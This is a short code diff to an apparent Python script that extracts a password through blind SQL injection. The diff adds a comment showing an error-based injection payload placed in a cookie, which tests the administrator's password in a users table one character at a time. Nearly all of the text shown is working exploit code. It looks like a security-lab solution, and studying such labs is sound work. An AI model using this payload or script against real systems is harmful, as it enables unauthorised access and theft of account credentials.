@@ -3,7 +3,7 @@ import string
 
 
 URL = input("Input URL: ").strip()
-template = input("Input cookie: ")
+template = input("Input cookie: ") # Example: XYZABCDEFG'||(SELECT CASE WHEN SUBSTR(password, {i}, 1)='{char}' THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username='administrator')||'
 charset = string.ascii_letters + string.digits
 password = ""
 
